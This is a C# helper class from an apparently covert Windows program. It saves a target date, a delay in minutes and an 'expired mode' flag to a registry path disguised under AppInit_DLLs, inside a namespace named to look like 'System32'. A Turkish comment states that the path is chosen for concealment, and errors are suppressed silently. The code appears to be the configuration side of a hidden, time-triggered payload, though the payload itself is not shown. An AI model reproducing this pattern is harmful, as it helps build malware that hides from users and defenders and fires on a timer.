using Microsoft.Win32;
using System;

namespace Sysstem32.Helpers
{
    public static class ConfigManager
    {
        // Karmaşık registry path (gizleme amaçlı)
        private const string REGISTRY_PATH = @"SOFTWARE\Microsoft\Windows\CurrentVersion\AppInit_DLLs\SystemCache";
        private const string TARGET_DATE_KEY = "dt_exp";
        private const string DELAY_MINUTES_KEY = "dl_min";
        private const string STATIC_DATE_KEY = "st_dt";
        private const string EXPIRED_MODE_KEY = "exp_md";

        public static void SaveTargetDate(DateTime targetDate)
        {
            SaveRegistryValue(TARGET_DATE_KEY, targetDate.ToBinary().ToString());
        }

        public static DateTime? GetTargetDate()
        {
            string value = GetRegistryValue(TARGET_DATE_KEY);
            if (string.IsNullOrEmpty(value)) return null;

            if (long.TryParse(value, out long binary))
                return DateTime.FromBinary(binary);
            return null;
        }

        public static void SaveDelayMinutes(int minutes)
        {
            SaveRegistryValue(DELAY_MINUTES_KEY, minutes.ToString());
        }

        public static int GetDelayMinutes()
        {
            string value = GetRegistryValue(DELAY_MINUTES_KEY);
            return int.TryParse(value, out int minutes) ? minutes : 5; // default 5 dakika
        }

        public static void SaveRegistryValue(string key, string value)
        {
            try
            {
                using (RegistryKey regKey = Registry.CurrentUser.CreateSubKey(REGISTRY_PATH))
                {
                    regKey?.SetValue(key, value);
                }
            }
            catch { /* Sessizce geç */ }
        }

        public static string GetRegistryValue(string key)
        {
            try
            {
                using (RegistryKey regKey = Registry.CurrentUser.OpenSubKey(REGISTRY_PATH))
                {
                    return regKey?.GetValue(key)?.ToString() ?? "";
                }
            }
            catch { return ""; }
        }
    }
}
